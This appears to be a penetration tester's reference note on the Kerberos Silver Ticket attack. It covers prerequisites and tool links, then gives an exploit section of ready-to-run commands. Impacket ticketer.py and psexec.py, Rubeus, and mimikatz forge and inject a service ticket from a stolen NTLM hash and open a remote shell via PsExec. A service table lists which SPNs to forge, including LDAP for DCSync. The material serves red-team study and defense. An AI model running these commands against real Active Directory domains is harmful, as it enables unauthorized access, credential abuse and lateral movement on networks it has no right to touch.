# Overview
A Silver Ticket attack involves forging a valid **service ticket (TGS)** for a specific service within a [[88 - Kerberos]] environment, using the service account's *NTLM* hash. Once crafted, the forged ticket allows an attacker to authenticate to the targeted service as any user, often bypassing domain controllers entirely. This technique is limited to individual services but offers stealthy, long-term access if the service account hash remains unchanged.

## Prerequisites
- Having the *NTLM* hash of a service account, such as a computer account, to forge a **Ticket Granting Service (TGS) ticket**.

## Tools
- [Impacket - ticketer.py](https://github.com/fortra/impacket/blob/master/examples/ticketer.py)
- [Impacket - psexec.py](https://github.com/fortra/impacket/blob/master/examples/psexec.py)
- [Rubeus Release](https://github.com/Flangvik/SharpCollection/blob/master/NetFramework_4.5_x64/Rubeus.exe)
- [mimikatz](https://github.com/gentilkiwi/mimikatz)


# Exploit
## Linux
```bash
python ticketer.py -nthash <HASH> -domain-sid <DOMAIN_SID> -domain <DOMAIN> -spn <SERVICE_PRINCIPAL_NAME> <USER>

export KRB5CCNAME=/root/impacket-examples/<TICKET_NAME>.ccache

python psexec.py <DOMAIN>/<USER>@<TARGET> -k -no-pass
```

## Windows
```powershell
# Using Rubeus
rubeus.exe asktgs /user:<USER> /rc4:<HASH> /domain:<DOMAIN> /ldap /service:cifs/<DOMAIN> /ptt /nowrap /printcmd /ptt

# Create the ticket
mimikatz.exe "kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> /rc4:<HASH> /user:<USER> /service:<SERVICE> /target:<TARGET>" /ptt

# Inject the ticket (If needed manually)
mimikatz.exe "kerberos::ptt <TICKET_FILE>"
.\Rubeus.exe ptt /ticket:<TICKET_FILE>

# Obtain a shell
.\PsExec.exe -accepteula \\<TARGET> cmd
```
For both `mimikatz` and `Rubeus`, the `/ptt` flag is used to automatically inject the ticket.

# Services
| Service Type                                | Service Silver Tickets          |
|---------------------------------------------|---------------------------------|
| WMI                                         | HOST, RPCSS                     |
| PowerShell Remoting                         | HOST, HTTP, WSMAN (depending on OS), RPCSS |
| WinRM                                       | HOST, HTTP (sometimes just WINRM) |
| Scheduled Tasks                             | HOST                            |
| Windows File Share, also psexec             | CIFS                            |
| LDAP operations, including DCSync           | LDAP                            |
| Windows Remote Server Administration Tools  | RPCSS, LDAP, CIFS               |
| Golden Tickets                              | krbtgt                          |


# References
- [https://www.crowdstrike.com/en-gb/cybersecurity-101/cyberattacks/silver-ticket-attack/](https://www.crowdstrike.com/en-gb/cybersecurity-101/cyberattacks/silver-ticket-attack/)
- [https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/silver-ticket.html](https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/silver-ticket.html)
- [https://www.netwrix.com/silver_ticket_attack_forged_service_tickets.html](https://www.netwrix.com/silver_ticket_attack_forged_service_tickets.html)
- [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)